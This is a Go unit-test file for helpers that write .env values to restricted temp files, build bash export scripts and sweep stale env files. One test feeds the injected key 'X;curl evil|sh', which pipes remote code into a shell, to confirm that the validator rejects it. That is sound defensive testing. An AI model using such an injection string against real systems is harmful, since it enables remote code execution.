package adapter

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestWriteDotEnvFile_CreatesMode0600(t *testing.T) {
	dir := t.TempDir()
	require.NoError(t, os.WriteFile(filepath.Join(dir, ".env"),
		[]byte("API_KEY=secretvalue\nDB_URL=postgres://x\n"), 0o644))

	path, cleanup, err := WriteDotEnvFile(dir)
	require.NoError(t, err)
	require.NotEmpty(t, path, "should create a file when .env is present")
	defer cleanup()

	info, err := os.Stat(path)
	require.NoError(t, err)
	// 0600 is mandatory for the credential-safety guarantee — anyone else on
	// the box must NOT be able to read the env values.
	assert.Equal(t, os.FileMode(0o600), info.Mode().Perm(), "env file must be mode 0600")

	body, err := os.ReadFile(path)
	require.NoError(t, err)
	// Format must be KEY=VALUE\n (docker --env-file format), no `export`,
	// no shell quoting — docker reads values literally.
	got := string(body)
	assert.Contains(t, got, "API_KEY=secretvalue\n")
	assert.Contains(t, got, "DB_URL=postgres://x\n")
}

func TestWriteDotEnvFile_NoEnvReturnsEmpty(t *testing.T) {
	dir := t.TempDir()
	path, cleanup, err := WriteDotEnvFile(dir)
	require.NoError(t, err)
	assert.Empty(t, path, "no .env → no tempfile")
	cleanup() // should be a noop
}

func TestWriteDotEnvFile_CleanupRemovesFile(t *testing.T) {
	dir := t.TempDir()
	require.NoError(t, os.WriteFile(filepath.Join(dir, ".env"), []byte("X=1\n"), 0o644))

	path, cleanup, err := WriteDotEnvFile(dir)
	require.NoError(t, err)
	require.NotEmpty(t, path)

	_, err = os.Stat(path)
	require.NoError(t, err, "file should exist before cleanup")

	cleanup()
	_, err = os.Stat(path)
	assert.True(t, os.IsNotExist(err), "cleanup must remove the tempfile")
}

func TestDotEnvExportScript_FormatsAsBashExports(t *testing.T) {
	dir := t.TempDir()
	require.NoError(t, os.WriteFile(filepath.Join(dir, ".env"),
		[]byte("API_KEY=hunter2\nWITH_SPACE=hello world\n"), 0o644))

	script, err := DotEnvExportScript(dir)
	require.NoError(t, err)

	// Each line should be `export KEY='VALUE'` so it's safe to source in bash.
	lines := strings.Split(strings.TrimRight(script, "\n"), "\n")
	require.Len(t, lines, 2)
	for _, line := range lines {
		assert.True(t, strings.HasPrefix(line, "export "), "expected 'export ' prefix; got %q", line)
	}
	// Spaces must be shell-quoted so bash treats the value as one argument.
	assert.Contains(t, script, "WITH_SPACE='hello world'\n")
}

// Extra env keys don't come from .env (which validates them), so they must be
// validated too — a key with shell metacharacters would be command injection on
// the `export <key>=...` path where value-quoting can't protect the left side.
func TestDotEnvExportScript_RejectsInvalidExtraKey(t *testing.T) {
	dir := t.TempDir() // no .env

	_, err := DotEnvExportScript(dir, map[string]string{"X;curl evil|sh": "1"})
	require.Error(t, err, "an extra key with shell metacharacters must be rejected")

	script, err := DotEnvExportScript(dir, map[string]string{"SHARD_INDEX": "0"})
	require.NoError(t, err, "a valid extra key is accepted")
	assert.Contains(t, script, "export SHARD_INDEX=")
}

func TestSweepStaleEnvFiles_RemovesOnlyStaleEnvFiles(t *testing.T) {
	tmp := os.TempDir()

	stale := filepath.Join(tmp, "dispatcher-env-stale-test.env")
	fresh := filepath.Join(tmp, "dispatcher-env-fresh-test.env")
	unrelated := filepath.Join(tmp, "dispatcher-unrelated-test.txt")
	for _, p := range []string{stale, fresh, unrelated} {
		require.NoError(t, os.WriteFile(p, []byte("X=1\n"), 0o600))
		defer os.Remove(p)
	}

	old := time.Now().Add(-2 * staleEnvFileThreshold)
	require.NoError(t, os.Chtimes(stale, old, old))

	require.NoError(t, SweepStaleEnvFiles())

	_, err := os.Stat(stale)
	assert.True(t, os.IsNotExist(err), "stale dispatcher-env file must be removed")
	_, err = os.Stat(fresh)
	assert.NoError(t, err, "fresh dispatcher-env file must remain")
	_, err = os.Stat(unrelated)
	assert.NoError(t, err, "unrelated file must remain")
}
